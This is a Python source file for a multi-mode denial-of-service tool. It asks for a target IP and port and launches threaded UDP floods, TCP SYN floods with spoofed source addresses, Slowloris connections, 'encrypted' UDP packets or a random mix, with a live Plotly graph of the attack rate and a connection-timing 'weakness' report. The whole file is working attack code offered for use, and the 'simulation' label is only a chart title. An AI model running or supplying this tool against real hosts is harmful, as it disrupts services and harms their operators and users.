import socket
import threading
import random
import time
import requests
import plotly.graph_objects as go
from scapy.all import IP, TCP, UDP, send
from Crypto.Cipher import AES
import base64
import sys

# === User Input with Validation ===
def get_int_input(prompt, min_val, max_val):
    while True:
        try:
            value = int(input(prompt))
            if min_val <= value <= max_val:
                return value
            print(f"❌ Enter a value between {min_val} and {max_val}.")
        except ValueError:
            print("❌ Invalid input. Enter a number.")

target_ip = input("🌐 Enter Target IP: ")
target_port = get_int_input("📡 Enter Target Port (1-65535): ", 1, 65535)
packet_size = get_int_input("📦 Enter Packet Size (100-65507 bytes): ", 100, 65507)
threads = get_int_input("🚀 Enter Number of Threads (1-500): ", 1, 500)
attack_type = input("🔥 Choose Attack Type (UDP/TCP/SLOWLORIS/ENCRYPTED/SPOOFED/MIXED): ").upper()

stop_flag = threading.Event()
attack_rate = 0  # Dynamic attack rate (packets/sec)

# === IP Spoofing (Fake IP Rotation) ===
def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# === Encryption Setup ===
key = b'abcdefghijklmnop'
cipher = AES.new(key, AES.MODE_ECB)

def pad_data(data):
    return data.ljust(16, b'\0')

def encrypt(data):
    return base64.b64encode(cipher.encrypt(pad_data(data)))

# === Attack Functions ===
def udp_flood():
    global attack_rate
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(packet_size)
    
    while not stop_flag.is_set():
        try:
            sock.sendto(packet, (target_ip, target_port))
            attack_rate += 1
            time.sleep(0.01)
        except:
            pass

def tcp_syn_flood():
    global attack_rate
    while not stop_flag.is_set():
        try:
            packet = IP(src=random_ip(), dst=target_ip) / TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
            attack_rate += 1
            time.sleep(0.01)
        except:
            pass

def slowloris():
    global attack_rate
    connections = []
    try:
        for _ in range(threads):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            connections.append(sock)

        while not stop_flag.is_set():
            for sock in connections:
                try:
                    sock.send(b"X-a: Keep Connection Alive\r\n")
                    attack_rate += 1
                except:
                    connections.remove(sock)
            time.sleep(5)
    except:
        pass

def encrypted_attack():
    global attack_rate
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not stop_flag.is_set():
        try:
            raw_packet = random._urandom(packet_size)
            encrypted_packet = encrypt(raw_packet)
            sock.sendto(encrypted_packet, (target_ip, target_port))
            attack_rate += 1
            time.sleep(0.01)
        except:
            pass

def spoofed_attack():
    global attack_rate
    while not stop_flag.is_set():
        try:
            fake_ip = random_ip()
            packet = IP(src=fake_ip, dst=target_ip) / UDP(dport=target_port)
            send(packet, verbose=False)
            attack_rate += 1
            time.sleep(0.01)
        except:
            pass

def mixed_attack():
    """Combines multiple attack methods"""
    global attack_rate
    while not stop_flag.is_set():
        try:
            choice = random.choice(["UDP", "TCP", "SLOWLORIS", "ENCRYPTED", "SPOOFED"])
            attack_methods[choice]()
        except:
            pass

# === Real-Time Attack Monitoring using Plotly ===
def monitor_attack():
    global attack_rate
    attack_rates = []
    times = []
    
    start_time = time.time()
    
    while not stop_flag.is_set():
        times.append(time.time() - start_time)
        attack_rates.append(attack_rate)

        fig = go.Figure()
        fig.add_trace(go.Scatter(x=times, y=attack_rates, mode='lines+markers', name="Attack Rate"))
        fig.update_layout(title="DDoS Attack Simulation", xaxis_title="Time (seconds)", yaxis_title="Attack Rate (packets/sec)")

        fig.show()
        time.sleep(1)
        attack_rate = 0  # Reset count every second

# === Weak Spot Detection ===
def test_server():
    print("\n🛠 Running Server Weakness Test...")
    start_time = time.time()
    
    response_times = []
    for i in range(5):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            start = time.time()
            sock.connect((target_ip, target_port))
            response_times.append(time.time() - start)
            sock.close()
        except:
            response_times.append(999)  # Timeout
        
    avg_response = sum(response_times) / len(response_times)
    weakness = "⚠️ High risk! Server response too slow." if avg_response > 1 else "✅ Server response is stable."
    
    with open("server_report.txt", "w") as report:
        report.write(f"🎯 Target: {target_ip}:{target_port}\n")
        report.write(f"📡 Average Response Time: {avg_response:.3f} sec\n")
        report.write(f"🛡️ Security Status: {weakness}\n")
    
    print(f"📊 Report Saved: server_report.txt\n{weakness}")

# === Launch Attack ===
attack_methods = {
    "UDP": udp_flood,
    "TCP": tcp_syn_flood,
    "SLOWLORIS": slowloris,
    "ENCRYPTED": encrypted_attack,
    "SPOOFED": spoofed_attack,
    "MIXED": mixed_attack
}

# Run Weak Spot Detection Before Attack
test_server()

threads_list = []

try:
    monitor_thread = threading.Thread(target=monitor_attack)
    monitor_thread.start()
    threads_list.append(monitor_thread)

    for _ in range(threads):
        thread = threading.Thread(target=attack_methods.get(attack_type, udp_flood))
        thread.start()
        threads_list.append(thread)

    input("\n⏹️ Press ENTER to stop attack...\n")
    stop_flag.set()

    for thread in threads_list:
        thread.join()

    print("✅ Attack Stopped.")

except KeyboardInterrupt:
    stop_flag.set()
    print("\n❌ Attack stopped by user.")
    sys.exit(0)
